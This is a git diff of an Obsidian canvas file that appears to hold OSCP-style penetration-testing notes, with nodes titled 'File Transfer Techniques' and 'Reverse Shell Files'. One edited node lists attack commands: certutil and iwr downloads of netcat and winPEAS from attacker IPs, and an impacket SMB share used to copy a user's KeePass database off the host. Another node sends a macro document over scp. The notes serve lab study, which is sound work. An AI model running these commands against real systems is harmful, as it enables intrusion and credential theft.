@@ -2,7 +2,7 @@
 	"nodes":[
 		{"id":"6dda59e5a4257c22","type":"text","text":"All Tested Exploits ","x":-800,"y":-960,"width":250,"height":50,"color":"3"},
 		{"id":"129412cb79508110","type":"text","text":"File Transfer Techniques ","x":-900,"y":-845,"width":250,"height":60,"color":"4"},
-		{"id":"9feaa7e229e011d0","type":"text","text":"Certutil\niwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe\n\ncertutil -urlcache -f http://192.168.45.194/nc64.exe c:/windows/temp/nc64.exe\n\n\npython3 /home/kali/impacket/examples/smbserver.py -smb2support myshare . \ncopy C:\\Users\\jim\\Documents\\Database.kdbx \\\\192.168.45.172\\myshare\\Database.kdbx","x":-2120,"y":-1120,"width":860,"height":310,"color":"4"},
+		{"id":"9feaa7e229e011d0","type":"text","text":"Certutil\niwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe\n\ncertutil -urlcache -f http://192.168.45.196/nc64.exe c:/windows/temp/nc64.exe\n\n\npython3 /home/kali/impacket/examples/smbserver.py -smb2support myshare . \ncopy C:\\Users\\jim\\Documents\\Database.kdbx \\\\192.168.45.172\\myshare\\Database.kdbx","x":-2120,"y":-1120,"width":860,"height":310,"color":"4"},
 		{"id":"dcb72f23506e5c10","type":"text","text":"==Scp==\nscp mymacro.doc kali@192.168.45.230:/home/kali/OSCP/11/\n\n==Wget==","x":-2120,"y":-785,"width":860,"height":335,"color":"4"},
 		{"id":"dbdf51054315480d","type":"text","text":"All Port Default Services","x":-850,"y":-647,"width":250,"height":60,"color":"5"},
 		{"id":"0e60e7aeeced2f86","type":"text","text":"Reverse Shell Files ","x":-798,"y":-398,"width":250,"height":60,"color":"6"},
